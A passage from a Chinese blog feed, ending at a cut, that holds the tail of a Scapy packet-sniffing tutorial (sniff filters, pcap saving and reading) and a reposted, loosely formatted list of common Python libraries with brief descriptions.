结束监听。</span></span><br><span class="line"><span class="string">4. sniff也支持无线网卡的监听模式。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h6 id="抓包、分析包"><a href="#抓包、分析包" class="headerlink" title="抓包、分析包"></a>抓包、分析包</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">prn指向一个回调函数，意为将收到的包丢给prn指向的函数处理（注意：回调的意义！每收到一个包就丢到回调函数里执行一下，执行完了才再跑回来继续抓包）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">filter为包过滤规则（语法参照tcpdump过滤规则）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">store为是否要存储抓到的包（注意，如果没有存储则不会将抓到的包赋值给a，因为没有存下就没有东西可以赋，此参数默认开启）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">timeout为抓包时长，比如抓30秒就结束（注意：如果没有指定抓包时长则会一直抓下去，程序会一直卡在这里）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">iface为指定抓包的网卡</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">a = sniff(prn=abc, filter=<span class="string">'tcp port 80 and ip 192.168.1.1'</span>, store=<span class="number">1</span>, timeout=<span class="number">30</span>, iface=<span class="string">'eth0'</span>)   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 此函数可以将抓到的包存到本地（注意：将包写入本地不能使用open（'packet.cap', 'r'）,因为open函数只能写入字符串）。</span></span><br><span class="line">wrpcap(<span class="string">'packet.cap'</span>, a)    </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 此函数可以将本地存储的数据包读取出来</span></span><br><span class="line">bbb = rdpcap(<span class="string">'/root/Desktop/ftp.cap'</span>) </span><br><span class="line"><span class="comment"># 读取出来的对象是由N个数据包组成的可迭代对象，每次迭代一个包</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bbb:</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="comment"># 输出数据包的应用层负载</span></span><br><span class="line">        print(i.getlayer(<span class="string">'Raw'</span>).fields[<span class="string">'load'</span>].decode().strip())   </span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>先简单了解一下，剩下的后面慢慢学</p><blockquote><p>更多用法见官方文档：<a href="https://scapy.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://scapy.readthedocs.io/en/latest/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      scapy -- 网络编程之利器
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="Scapy" scheme="http://www.xpshuai.cn/tags/Scapy/"/>
    
  </entry>
  
  <entry>
    <title>python-常用库</title>
    <link href="http://www.xpshuai.cn/python-%E5%B8%B8%E7%94%A8%E5%BA%93/"/>
    <id>http://www.xpshuai.cn/python-常用库/</id>
    <published>2020-02-19T13:01:27.000Z</published>
    <updated>2020-02-20T10:13:37.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转载自：<a href="https://www.jianshu.com/p/d25a9169fe86" target="_blank" rel="noopener">https://www.jianshu.com/p/d25a9169fe86</a></p></blockquote><p>哈哈哈，我见大佬把这么多库都整理出来了，赶紧转载一下，太厉害啦。</p><p>库名称        简介</p><p>Chardet 字符编码探测器，可以自动检测文本、网页、xml的编码。</p><p>colorama 主要用来给文本添加各种颜色，并且非常简单易用。</p><p>Prettytable 主要用于在终端或浏览器端构建格式化的输出。</p><p>difflib，[Python]标准库，计算文本差异Levenshtein，快速计算字符串相似度。</p><p>fuzzywuzzy 字符串模糊匹配。</p><p>esmre 正则表达式的加速器。</p><p>shortuuid 一组简洁URL/UUID函数库。</p><p>ftfy，Unicode文本工具7</p><p>unidecode，ascii和Unicode文本转换函数。</p><p>xpinyin，将汉字转换为拼音的函数库</p><p>pangu.py，调整对中日韩文字当中的字母、数字间距。</p><p>pyfiglet，Python写的figlet程序，使用字符组成ASCII艺术图片</p><p>uniout，提取字符串中可读写的字符</p><p>awesome slugify，一个Python slugify库，用于处理Unicode。</p><p>python-slugify，转换Unicode为ASCII内码的slugify函数库。</p><p>unicode-slugify，生成unicode内码，Django的依赖包。</p><p>ply，Python版的lex和yacc的解析工具phonenumbers，解析电话号码，格式，存储和验证的国际电话号码。</p><p>python-user-agents，浏览器的用户代理（user-agents）的解析器。</p><p>sqlparse，SQL解析器。</p><p>pygments，一个通用的语法高亮工具。</p><p>python-nameparser，解析人名，分解为单独的成分。</p><p>pyparsing，通用解析器生成框架。</p><p>tablib，表格数据格式，包括，XLS、CSV，JSON，YAML。</p><p>python-docx，docx文档读取，查询和修改，微软Word 2007 / 2008的docx文件。</p><p>xlwt/xlrd，读写Excel格式的数据文件。</p><p>xlsxwriter，创建Excel格式的xlsx文件。</p><p>xlwings，利用Python调用Excelcsvkit，CSV文件工具包。</p><p>marmir，把Python[数据结构]，转化为电子表格。</p><p>pdfminer，从PDF文件中提取信息。</p><p>pypdf2， 合并和转换PDF页面的函数库。</p><p>Python-Markdown，轻量级标记语言Markdown的Python实现。</p><p>Mistune，,快速、全功能的纯Python编写的Markdown解释器。</p><p>dateutil，标准的Python官方datetime模块的扩展包，字符串日期工具，其中parser是根据字符串解析成</p><p>datetime，而rrule是则是根据定义的规则来生成datetime。</p><p>arrow,更好的日期和时间处理Python库</p><p>chronyk，一个Python 3版函数库，用于解析人写的时间和日期。</p><p>delorean，清理期时间的函数库。</p><p>when.py，为见的日期和时间，提供人性化的功能。</p><p>moment，类似Moment.js的日期/时间Python库</p><p>pytz，世界时区，使用tz database时区信息[数据库]</p><p>BeautifulSoup，基于Python的HTML/XML解析器，简单易用, 功能很强大,即使是有bug，有问题的html代码，也可以解析。</p><p>lxml，快速，易用、灵活的HTML和XML处理库，功能超强，在遇到有缺陷、不规范的xml时，Python自带的xml处理器可能无法解析。报错时，程序会尝试再用lxml的修复模式解析。</p><p>htmlparser，官方版解析HTML DOM树，偶尔搞搞命令行自动表单提交用得上。</p><p>pyyaml，Python版本的YAML解释器。</p><p>html5lib，-标准库，解析和序列化HTML文档和片段。</p><p>pyquery，类似[jQuery]的的HTML解释器函数库。</p><p>cssutils，Python CSS库。</p><p>MarkupSafe，XML或HTML / XHTML安全字符串标记工具。</p><p>cssutils - ACSS library for Python., MarkupSafe - Implements a XML/HTML/XHTMLbleach，漂白，基于HTML的白名单函数库。</p><p>xmltodict，类似JSON的XML工具包。</p><p>xhtml2pdf，HTML / CSS格式转换器，看生成pdf文档。</p><p>untangle，把XML文档，转换为Python对象，方便访问。</p><p>文件处理</p><p>库名称简介Mimetypes，Python标准库，映射文件名到MIME类型。</p><p>imghdr，Python标准库，确定图像类型。</p><p>python-magic，libmagic文件类型识别库，Python接口格式。</p><p>path.py，os.path模块的二次封装。</p><p>watchdog，一组API和shell实用程序，用于监视文件系统事件。</p><p>Unipath，面向对象的文件/目录的操作工具包。</p><p>pathlib，-（Python 3.4版已经作为Python标准库），一个跨平台，面向path的函数库。pickle/cPickle,python的pickle模块实现了基本的数据序列和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。</p><p>cPickle是[C语言]实现的版本，速度更快。</p><p>ConfigParser，Python标准库，INI文件解析器。</p><p>configobj，INI文件解析器。</p><p>config，分层次配置，logging作者编写。</p><p>profig，多格式配置转换工具。</p><p>logging，Python标准库，日志文件生成管理函数库。</p><p>logbook，logging的替换品。</p><p>Sentry，实时log服务器。</p><p>Raven，哨兵Sentry的Python客户端。</p><p>Sphinx，斯芬克斯（狮身人面像），Python文档生成器。</p><p>reStructuredText，标记语法和解析工具，Docutils组件。</p><p>mkdocs，Markdown格式文档生成器。</p><p>pycco，简单快速、编程风格的文档生成器。</p><p>pdoc，自动生成的Python库API文档epydoc，从源码注释中生成各种格式文档的工具</p><p>图像处理</p><p>库名称简介PIL（Python Image Library），基于Python的图像处理库，功能强大，对图形文件的格式支持广泛，内置许多图像处理函数，如图像增强、滤波[算法]等。</p><p>Pillow，图像处理库，PIL图像库的分支和升级替代产品。</p><p>Matplotlib，著名的绘图库，提供了整套和matlab相似的命令API，用以绘制一些高质量的数学二维图形，十分适合交互式地进行制图。</p><p>brewer2mpl，有一个专业的python配色工具包，提供了从美术角度来讲的精美配色。</p><p>PyGame基于Python的多媒体开发和游戏软件开发模块，包含大量游戏和图像处理功能。</p><p>Box2d，开源的2d物理引擎，愤怒的小鸟就是使用了这款物理引擎进行开发的，Box2d物理引擎内部模拟了一个世界，你可以设置这个世界里的重力，然后往这个世界里添加各种物体，以及他们的一些物理特性，比如质量，摩擦，阻尼等等。</p><p>Pymunk，类似box2d的开源物理图形模拟库。</p><p>OpenCV, 目前最好的开源图像/视觉库，包括图像处理和计算机视觉方面、[机器学习]的很多通用算法。</p><p>SimpleCV，计算机视觉开源框架，类似opencv。</p><p>VTK，视觉化工具函式库（VTK， Visualization Toolkit）是一个开放源码，跨平台、支援平行处理（VTK曾用于处理大小近乎1个Petabyte的资料，其平台为美国Los Alamos国家实验室所有的具1024个处理器之大型系统）的图形应用函式库。2005年时曾被美国陆军研究实验室用于即时模拟俄罗斯制反导弹战车ZSU23-4受到平面波攻击的情形，其计算节点高达2.5兆个之多。</p><p>cgkit,Python Computer Graphics Kit,其module 主要分两个部分</p><p>\1. 与3d相关的一些python module 例如the vector, matrix and quaternion types, the RenderMan bindings, noise functions 这些模块可以在maya houdini nuke blender 等有Python扩展的程序中直接用;</p><p>\2. 提供完整的场景操作的module， 他类似其他三维软件，在内存中保留完整的描述场景的信息。不能直接用于maya 等。</p><p>CGAL，Computational Geometry Algorithms Library，计算几何算法库，提供计算几何相关的数据结构和算法，诸如三角剖分（2D约束三角剖分及二维和三维Delaunay三角剖分），Voronoi图（二维和三维的点，2D加权Voronoi图，分割Voronoi图等），多边形（布尔操作，偏置），多面体（布尔运算），曲线整理及其应用，网格生成（二维Delaunay网格生成和三维表面和体积网格生成等），几何处理（表面网格简化，细分和参数化等），凸壳算法（2D，3D和dD），搜索结构（近邻搜索，kd树等），插值，形状分析，拟合，距离等。</p><p>Aggdraw，开源图像库，几乎涵盖了2d image操作的所有功能，使用起来非常灵活。</p><p>Pycairo,开源矢量绘图库</p><p>Cairo开罗的python接口，cairo提供在多个背景下做2-D的绘图，高级的更可以使用硬件加速功能。</p><p>wand，Python绑定魔杖工具（MagickWand），C语言API接口。</p><p>thumbor， -智能成像工具，可调整大小和翻转图像。</p><p>imgSeek，查询相似的图像。</p><p>python-qrcode，纯Python的二维码（QR码）生成器。</p><p>pyBarcode，创建条码，无需PIL模块。</p><p>pygram，Instagram像图像过滤器。</p><p>Quads，基于四叉树的计算机艺术。</p><p>nude.py，裸体检测函数。</p><p>scikit-image，scikit工具箱的图像处理库。</p><p>hmap，图像直方图工具。</p><p>bokeh，交互的Web绘图。</p><p>plotly，Web协同的Python和Matplotlib绘制。</p><p>vincent，文森特，Python Vega的函数库。</p><p>d3py，Python绘图库，基于D3.JS, ggplot -API兼容R语言的ggplot2.Kartograph.py，在Python绘制漂亮的SVG地图。</p><p>pygal， SVG图表的创造者。</p><p>pygraphviz，Graphviz的Python接口。</p><p>Fonttlools，ttf字体工具函数包，用于fontforge、ttx等字体软件。</p><p>游戏和多媒体</p><p>库名称简介audiolazy，数字信号处理（DSP）的Python工具包。</p><p>audioread，跨平台（GStreamer + Core Audio + MAD + FFmpeg）音频解码库。</p><p>beets，音乐库管理。dejavu，音频指纹识别算法。</p><p>Dejavu 听一次音频后就会记录该音频的指纹信息，然后可通过麦克风对输入的音频进行识别是否同一首歌。</p><p>django-elastic-transcoder,Django +亚马逊elastic转码。</p><p>eyeD3,音频文件工具，特别是MP3文件包含的ID3元数据。</p><p>id3reader，用于读取MP3的元数据。</p><p>mutagen，处理音频元数据。</p><p>pydub，-操纵音频和简单的高层次的接口。</p><p>pyechonest，Echo Nest API客户端。</p><p>talkbox，语音和信号处理的Python库。</p><p>TimeSide，开放的网络音频处理框架。</p><p>tinytag，读取音乐文件元数据，包括的MP3，OGG，FLAC和wave文件。</p><p>m3u8，用于解析m3u8文件。</p><p>moviepy，多格式视频编辑脚本模块，包括GIF动画。</p><p>shorten.tv，视频摘要。scikit视频，SciPy视频处理例程。</p><p>GeoDjango,一个世界级的地理Web框架。</p><p>geopy,Geo地理编码的工具箱。</p><p>pygeoip，纯Python写的GeoIP API。</p><p>GeoIP，Python API接口，使用高精度GeoIP Legacy Database数据库。</p><p>geojson，GeoJSON函数库django-countries，一个Django程序，提供国家选择，国旗图标的静态文件，和一个国家的地域模型。</p><p>Pygame，Python游戏设计模块。</p><p>Cocos2d，2D游戏框架，演示，和其他的图形/交互应用，基于pyglet。Cocos2d- cocos2d is a framework for building 2D games, demos, and other graphical/interactive applications. It is based on pyglet.,PySDL2，SDL2的封装库。</p><p>Panda3D- 3D游戏引擎，迪士尼开发。用C++写的，完全兼容Python。</p><p>PyOgre，OGRE 3D渲染引擎，可用于游戏，模拟，任何3D。</p><p>PyOpenGL，绑定OpenGL和它相关的API。</p><p>PySFML，Python绑定SFMLRenPy，视觉小说引擎。</p><p>大数据与科学计算</p><p>库名称简介pycuda/opencl，GPU高性能并发计算Pandas，python实现的类似R语言的数据统计、分析平台。基于NumPy和Matplotlib开发的，主要用于数据分析和数据可视化，它的数据结构DataFrame和R语言里的data.frame很像，特别是对于时间序列数据有自己的一套分析机制，非常不错。</p><p>Open Mining，商业智能（BI），Pandas的Web界面。</p><p>blaze，NumPy和Pandas大数据界面。</p><p>SciPy，开源的Python算法库和数学工具包，SciPy包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。其功能与软件MATLAB、Scilab和GNU Octave类似。Numpy和Scipy常常结合着使用，Python大多数机器学习库都依赖于这两个模块。</p><p>ScientificPython，一组经过挑选的Python程序模块，用于科学计算，包括几何学（矢量、张量、变换、矢量和张量场），四元数，自动求导数，（线性）插值，多项式，基础统计学，非线性最小二乘拟合，单位计算，Fortran兼容的文本格式，通过VRML的3D显示，以及两个Tk小工具，分别用于绘制线图和3D网格模型。此外还具有到netCDF，MPI和BSPlib库的接口。</p><p>NumPy科学计算库，提供了矩阵，线性代数，傅立叶变换等等的解决方案, 最常用的是它的N维数组对象. NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。</p><p>Cvxopt，最优化计算包，可进行线性规划、二次规划、半正定规划等的计算。</p><p>Numba，科学计算速度优化编译器。</p><p>pymvpa2，是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。</p><p>NetworkX，复杂网络的优化软件包。</p><p>zipline，交易算法的函数库。</p><p>PyDy， Python动态建模函数库。</p><p>SymPy,符号数学的Python库。</p><p>statsmodels,Python的统计建模和计量经济学。</p><p>astropy,天文学界的Python库。</p><p>orange，橙色，数据挖掘，数据可视化，通过可视化编程或Python脚本学习机分析。RDKit,化学信息学和机器学习的软件。</p><p>Open Babel，巴贝尔，开放的化学工具箱。</p><p>cclib，化学软件包的计算函数库。</p><p>Biopython，免费的生物计算工具包。</p><p>bccb，生物分析相关的代码集。</p><p>bcbio-nextgen，提供完全自动化、高通量、测序分析的工具包。</p><p>visvis, 可视化计算模块库，可进行一维到四维数据的可视化。</p><p>MapReduce是Google提出的一个软件[架构]，用于大规模数据集（大于1TB）的并行运算。概念“Map（映射）”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的MapReduce函数库。</p><p>Framworks and libraries for MapReduce.,PySpark，[Spark]的Python API。dpark，Spark的Python克隆，Python中的MapReduce框架。</p><p>luigi，为批量工作，建立复杂的管道。</p><p>mrjob，运行在[Hadoop]，或亚马逊网络服务的，MapReduce工作。</p><p>人工智能与机器学习</p><p>库名称简介NLTK（natural language toolkit)，是python的自然语言处理工具包。2001年推出，包括了大量的词料库，以及自然语言处理方面的算法实现：分词， 词根计算， 分类， 语义分析等。</p><p>Pattern，数据挖掘模块，包括自然语言处理，机器学习工具，等等。</p><p>textblob，提供API为自然语言处理、分解NLP任务。基于NLTK和Pattern模块。</p><p>jieba，结巴，中文分词工具。</p><p>snownlp，用于处理中文文本库。</p><p>loso，中文分词函数库。</p><p>genius，中文CRF基础库，条件随机场(conditional random field,简称 CRF),是一种鉴别式机率模型,是随机场的一种,常用于标注或分析序列资料,如自然语言文字或是生物序列。</p><p>Gensim，一个相当专业的主题模型Python工具包，无论是代码还是文档，可用于如何计算两个文档的相似度LIBSVM,是台湾大学林智仁(Lin Chih-Jen)教授等开发设计的一个简单、易于使用和快速有效的SVM模式识别与回归的软件包，他不但提供了编译好的可在Windows系列系统的执行文件，还提供了源代码，方便改进、修改以及在其它[操作系统]上应用；该软件对SVM所涉及的参数调节相对比较少，提供了很多的默认参数，利用这些默认参数可以解决很多问题；并提供了交互检验(Cross Validation)的功能。该软件可以解决C-SVM、ν-SVM、ε-SVR和ν-SVR等问题，包括基于一对一算法的多类模式识别问题。</p><p>scikits.learn，构建在SciPy之上用于机器学习的 Python 模块。它包括简单而高效的工具，可用于数据挖掘和数据分析。涵盖分类，回归和聚类算法，例如SVM， 逻辑回归，朴素贝叶斯，随机森林，k-means等算法，代码和文档都非常不错，在许多Python项目中都有应用。例如在我们熟悉的NLTK中，分类器方面就有专门针对scikit-learn的接口，可以调用scikit-learn的分类算法以及训练数据来训练分类器模型。</p><p>PyMC，机器学习采样工具包，scikit-learn似乎是所有人的宠儿，有人认为，PyMC更有魅力。PyMC主要用来做Bayesian分析。</p><p>Orange，基于组件的数据挖掘和机器学习软件套装，它的功能即友好，又很强大，快速而又多功能的可视化编程前端，以便浏览数据分析和可视化，包含了完整的一系列的组件以进行数据预处理，并提供了数据帐目，过渡，建模，模式评估和勘探的功能。侧重数据挖掘，可以用可视化语言或Python进行操作，拥有机器学习组件，还具有生物信息学以及文本挖掘的插件。</p><p>Milk，机器学习工具箱，其重点是提供监督分类法与几种有效的分类分析：SVMs(基于libsvm)，K-NN，随机森林经济和决策树。它还可以进行特征选择。这些分类可以在许多方面相结合，形成不同的分类系统。对于无监督学习，它提供K-means和affinity propagation聚类算法。</p><p>PyMVPA(Multivariate Pattern Analysis in Python),是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。</p><p>NuPIC，开源人工智能平台。该项目由Grok（原名 Numenta）公司开发，其中包括了公司的算法和软件架构。NuPIC 的运作接近于人脑，“当模式变化的时候，它会忘掉旧模式，记忆新模式”。如人脑一样，CLA 算法能够适应新的变化。</p><p>Pylearn2，-基于Theano的机器学习库。</p><p>hebel，GPU加速，[深度学习]Python库。</p><p>gensim，机器学习库。</p><p>pybrain，机器学习模块，它的目标是为机器学习任务提供灵活、易应、强大的机器学习算法。pybrain包括神经网络、强化学习(及二者结合)、无监督学习、进化算法。以神经网络为核心，所有的训练方法都以神经网络为一个实例Mahout,是 Apache Software Foundation（ASF） 旗下的一个开源项目，提供一些可扩展的机器学习领域经典算法的实现，旨在帮助开发人员更加方便快捷地创建智能应用程序。Mahout包含许多实现，包括聚类、分类、推荐过滤、频繁子项挖掘。此外，通过使用 Apache Hadoop 库，Mahout 可以有效地扩展到云中。</p><p>Crab，灵活的，快速的推荐引擎。</p><p>python-recsys，娱乐系统分析，推荐系统。</p><p>vowpal_porpoise，Vowpal Wabbit轻量级Python封装。</p><p>Theano,用来定义、优化和模拟数学表达式计算，用于高效的解决多维数组的计算问题的python软件包。它使得写深度学习模型更加容易，同时也给出了一些关于在GPU上训练它们的选项。</p><p>系统与命令行</p><p>库名称简介threading，Python标准线程库，更高级别的线程接口。</p><p>envoy，特使，Python子线程的函数库。</p><p>sh，成熟的子线程替换函数库。</p><p>sarge，封装线程。</p><p>subprocess,调用shell命令的神器argparse，写命令行脚本必备，强大的命令行差数解析工具timeit，计算代码运行的时间等等unp，命令行工具，解压文件。</p><p>eventlet开销很少的多线程模块，使用的是 green threads 概念，例如，pool = eventlet.GreenPool(10000) 这样一条语句便创建了一个可以处理 10000 个客户端连接的线程池。类似Gevent线程库Gevent，多线程模块pytools,著名的python通用函数、工具包SendKeys, 键盘鼠标操作模块, 模拟键盘鼠标模拟操作。</p><p>pyHook,基于Python的“钩子”库，主要用于监听当前电脑上鼠标和键盘的事件。这个库依赖于另一个Python库PyWin32，如同名字所显示的，PyWin32只能运行在Windows平台，所以PyHook也只能运行在Windows平台。</p><p>pstuil,跨平台地很方便获取和控制系统的进程，以及读取系统的CPU占用内存占用等信息.</p><p>cement，一个轻量级的、功能齐全的命令行工具</p><p>click，简单优雅的的命令行接口。</p><p>clint，Python命令行工具。</p><p>cliff，创造多层次指令的命令行程序框架。</p><p>Clime， 可以转换任何模块为多的CLI命令程序，无任何配置。</p><p>docopt，Python命令行参数分析器。</p><p>pycli，命令行应用程序，支持的标准命令行解析，测井，单元[测试]和功能测试。</p><p>Gooey，打开命令行程序，作为为一个完整的GUI应用程序,cookiecutter，命令行工具，从cookiecutters（项目模板）创建项目。例如，Python包项目，jQuery插件项目。percol，为UNIX传统管道pipe命令，添加交互式选择风格。</p><p>rainbowstream，聪明和漂亮的推特客户终端。</p><p>Django Models，Django的一部分SQLAlchemy，Python SQL工具包和对象关系映射。</p><p>peewee，小型的ORM解析器。</p><p>PonyORM，为ORM提供了一种面向SQL的接口。</p><p>MongoEngine，Python对象文件映射，使用[MongoDB]。, Django MongoDB引擎MongoDB , Django后台。</p><p>django-mongodb-engine，Django后台.redisco,一个简单的模型和容器库，使用[Redis]flywheel，Amazon DynamoDB对象映射。</p><p>butterdb，谷歌电子表格的ORM，Python版。</p><p>celery，芹菜，异步任务队列/工作，基于分布式消息队列。</p><p>huey，休伊，轻量级，多线程任务队列。</p><p>mrq，队列先生，分布式任务队列，使用redis &amp; Gevent。</p><p>rq，简单的工作队列。</p><p>Queue,Queue模块可以用来实现多线程间通讯，让各个线程共享数据，生产者把货物放到Queue中，供消费者（线程）去使用。</p><p>simpleq，简单的，可扩展的队列，Amazon SQS基础队列。</p><p>Psyco，超强的python性能优化工具，psyco 的神奇在于它只需要在代码的入口处调用短短两行代码，性能就能提升 40% 或更多，真可谓是立竿见影！如果你的客户觉得你的程序有点慢，敬请不要急着去优化代码，psyco 或许能让他立即改变看法。psyco 堪称 Python 的 jit。fn.py，Python函数编程：缺失的功能享受FP的实现。</p><p>funcy，函数编程工具。</p><p>Toolz，函数编程工具：迭代器、函数，字典。</p><p>CyToolz，Toolz的Cython实现，高性能的函数编程工具。</p><p>Ansible，安塞波，极为简单的自动化平台。</p><p>SaltStack，基础设施的自动化管理系统。</p><p>Fabric，织物，一个简单，远程执行和部署的语言工具。</p><p>Fabtools，Fabric的工具函数。</p><p>cuisine，热门的Fabric的工具函数。</p><p>psutil，跨平台的过程和系统工具模块。</p><p>pexpect，控制互动节目。</p><p>provy，易于使用的配置系统的Python。</p><p>honcho，Foreman的Python接口，用于管理procfile应用工具。</p><p>gunnery，多任务执行工具，与网络接口的分布式系统。</p><p>fig，快速。独立的开发环境中使用泊坞窗。</p><p>APScheduler，轻量级、但功能强大的在线任务调度程序。</p><p>django-schedule,Django日程应用程序。</p><p>doit,任务流道/生成工具。</p><p>Joblib,Python提供的轻量级的流水线工具函数。</p><p>Plan，简易生成crontab文件。</p><p>Spiff，纯Python实现的，功能强大的工作流引擎。</p><p>schedule，Python作业调度。</p><p>TaskFlow，有助于使任务执行简单。</p><p>ctypes，Python标准库，速度更快，Python调用C代码的外部函数接口。</p><p>cffi，Python调用C代码外部函数接口，类似于ctypes直接在python程序中调用c程序,但是比ctypes更方便不要求编译成so再调用。</p><p>Cytoolz，python 加速库SWIG，简化封装和接口生成器。</p><p>Cython，Python优化静态编译器。</p><p>PyPy，Python解释器的 Python实现。</p><p>Stackless Python，一个增强版本的Python。它使程序员从基于线程的编程方式中获得好处，并避免传统线程所带来的性能与复杂度问题。Stackless为 Python带来的微线程扩展，是一种低开销、轻量级的便利工具Pyston,使用LLVM和现代JIT技术,对python进行性能优化。</p><p>pythonlibs，非官方的Windows（32 / 64位）的Python扩展包scapy，优秀的数据包处理库。</p><p>ino，Arduino命令行工具。</p><p>Pyro，Python的机器人工具包。</p><p>pluginbase，一个简单而灵活的Python的插件系统。</p><p>itsdangerous，数据安全传输工具。</p><p>blinker，快速Python中的信号/事件调度系统。</p><p>pychievements，用于创建和跟踪成果框架。</p><p>python-patterns，Python中的设计模式。</p><p>pefileWindows PE文件解析器SIP，自动为C和C++库生成Python扩展模块的工具。</p><p>数据库</p><p>库名称简介MySQLdb，成熟的[MySQL]数据库模块,Baresql,SQL数据库包ZODB，Python本地对象数据库。一个K-V对象图数据库。</p><p>pickledb,简单和轻量级的K-V键值存储。</p><p>TinyDB, 轻量级，面向文档的数据库。</p><p>mysql-python，MySQL的Python工具库。</p><p>mysqlclient，mysql-python分支，支持Python 3.,PyMySQL,纯Python写的 MySQL驱动程序，兼容mysql-python。</p><p>mysql-connector-python,MySQL连接器,来自[Oracle]，纯Python编写。</p><p>oursql，MySQL连接器，提供本地话指令语句和BLOBs支持。</p><p>psycopg2，最流行的Python PostgreSQL适配器。</p><p>txpostgres，于Twisted的异步驱动，用于PostgreSQL。</p><p>queries,psycopg2函数库，用于PostgreSQL。dataset,存储Python字典数据,用于SQLite，MySQL和PostgreSQL。</p><p>cassandra-python-driver，开源分布式NoSQL数据库系统Apache Cassandra系统的Python驱动.pycassa,简化的cassandra数据库Python驱动。</p><p>HappyBase，友好的Apache [Hbase]的函数库。</p><p>PyMongo，MongoDB官方客户端。</p><p>Plyvel，LevelDB快速和功能丰富的Python接口。</p><p>redis-py,redis客户端。</p><p>py2neo,Python客户端(基于Neo4j的RESTful接口).</p><p>telephus,基于Twisted的cassandra客户端。</p><p>txRedis，基于Twisted的Redis客户端。</p><p>在学习Python的过程中，往往因为没有资料或者没人指导从而导致自己不想学下去了，因此我特意准备了个群 592539176 ，群里有大量的PDF书籍、教程都给大家免费使用！不管是学习到哪个阶段的小伙伴都可以获取到自己相对应的资料！</p><p>【网络】</p><p>Curl，Pycurl包是一个libcurl的Python接口，它是由C语言编写的。与urllib相比，它的速度要快很多。Libcurl是一个支持FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 和 LDAP的客户端URL传输库.libcurl也支持HTTPS认证,HTTP POST,HTTP PUT,FTP上传,代理,Cookies,基本身份验证,FTP文件断点继传,HTTP代理通道等等。</p><p>Requests，用Python语言编写，基于 urllib的开源 HTTP 库。它比 urllib 更加方便，更加 Pythoner。支持 Python3。</p><p>httpie，命令行HTTP客户端，用户友好的cURL的替换工具。</p><p>s3cmd，命令行工具，用于管理Amazon S3和CloudFront。</p><p>youtube-dl，命令行程序，从YouTube下载视频。</p><p>you-get，Python3写的视频下载工具，可用于YouTube/Youku优酷/Niconico视频下载Coursera，从coursera.org下载视频，可重新命名文件wikiteam，wiki下载工具。</p><p>subliminal，命令行工具，搜索和下载字幕的函数库。</p><p>requests，HTTP函数库，更加人性化。</p><p>grequests，异步HTTP请求+ Gevent（高性能高并发函数库）。</p><p>urllib3，一个线程安全的HTTP连接池，支持文件post。</p><p>httplib2，综合HTTP的客户端函数库。</p><p>treq， Python API接口，Twisted的HTTP客户。</p><p>Mininet，流行的网络仿真器,API采用python编写。</p><p>POX，基于Python的开源软件定义网络（SDN）控制开发平台的应用，如OpenFlow的SDN控制器。</p><p>Pyretic，SDN的编程语言，提供了强大的抽象在网络交换机或仿真器。</p><p>SDX Platform，基于SDN的IXP实现，利用最小网络，痘和热。</p><p>inbox.py，Python的SMTP服务器。</p><p>imbox， Python版本IMAP库。</p><p>inbox，收件箱，开源邮件工具包。</p><p>lamson,SMTP服务器。</p><p>flanker,侧卫,电子邮件地址和MIME解析库。</p><p>marrow.mailer,高性能可扩展邮件交付框架。</p><p>django-celery-ses， Django电子邮件后台，使用AWS SES和Celery。</p><p>modoboa，邮件托管和管理平台，包括现代和简化Web UI。</p><p>envelopes，邮件工具。</p><p>mailjet，批量邮寄mailjet API接口，带统计。</p><p>Talon，利爪，Mailgun库，提取消息和签名。mailjet- Mailjet API implementation for batch mailing, statistics and more., Talon - Mailgun library to extract message quotations and 